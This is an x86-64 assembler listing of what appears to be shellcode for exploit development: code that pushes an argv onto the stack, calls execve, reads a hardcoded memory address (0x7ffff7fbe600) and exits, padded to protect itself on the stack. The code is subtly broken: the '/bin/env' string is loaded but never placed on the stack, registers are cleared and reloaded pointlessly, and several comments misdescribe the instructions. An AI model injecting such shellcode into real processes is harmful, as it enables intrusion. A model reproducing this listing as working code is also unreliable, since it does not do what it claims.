     1                                  
     2                                  bits 64
     3                                  start:
     4                                  
     5                                    ; Clear RAX register
     6 00000000 4831C0                    xor rax, rax
     7                                  
     8                                    ; Load command string ("/bin/env") onto the stack
     9 00000003 4831D2                    xor rdx, rdx 
    10 00000006 52                        push rdx
    11 00000007 48B82F62696E2F656E-       mov rax, '/bin/env'
    11 00000010 76                 
    12                                  
    13                                    ; Load pointer to command string into rdi
    14 00000011 4889E7                    mov rdi, rsp
    15                                  
    16                                    ; Create argv array 
    17 00000014 57                        push rdi                 
    18 00000015 4831D2                    xor rdx, rdx 
    19 00000018 52                        push rdx             
    20                                  
    21                                    ; Load pointer to the argv array into RSI
    22 00000019 4889E6                    mov rsi, rsp
    23                                  
    24                                    ; get required value into RDX
    25 0000001C 4831C0                    xor rax, rax                ; Clear RAX register
    26 0000001F 66B8FF7F                  mov ax, 0x7fff              ; Load 0x7fff into the low 16 bits of RAX
    27 00000023 48C1E220                  shl rdx, 32                 ; Left shift RDX by 32 bits
    28 00000027 B9FFE6FBF7                mov ecx, 0xf7fbe6ff         ; Load 0xf7fbe6ff into ECX
    29 0000002C 30C9                      xor cl, cl                  ; Clear the low 8 bits of RCX
    30 0000002E 4809CA                    or rdx, rcx                 ; Combine registers using the OR instruction
    31 00000031 488B02                    mov rax, [rdx]              ; Load RAX with the qword (64 bits) from the memory 
    32                                  
    33                                    ; Clear RAX register
    34 00000034 4831C0                    xor rax, rax
    35                                  
    36                                    ; execve system call
    37 00000037 B83B000000                mov rax, 0x3b                 
    38 0000003C 0F05                      syscall
    39                                  
    40                                    ;Exit sys call 
    41 0000003E B03C                      mov al, 0x3c                
    42 00000040 31FF                      xor edi, edi                
    43 00000042 0F05                      syscall
    44                                  
    45                                  
    46                                    ; space for data so stack does not overflow the code
    47 00000044 FFFFFFFFFFFFFFFF          dq 0xffffffffffffffff
    48 0000004C FFFFFFFFFFFFFFFF          dq 0xffffffffffffffff
    49 00000054 FFFFFFFFFFFFFFFF          dq 0xffffffffffffffff
    50 0000005C FFFFFFFFFFFFFFFF          dq 0xffffffffffffffff
    51 00000064 FFFFFFFFFFFFFFFF          dq 0xffffffffffffffff
    52 0000006C 6C000000                  end: dd end-start
    53                                    
    54                                  
    55                                    
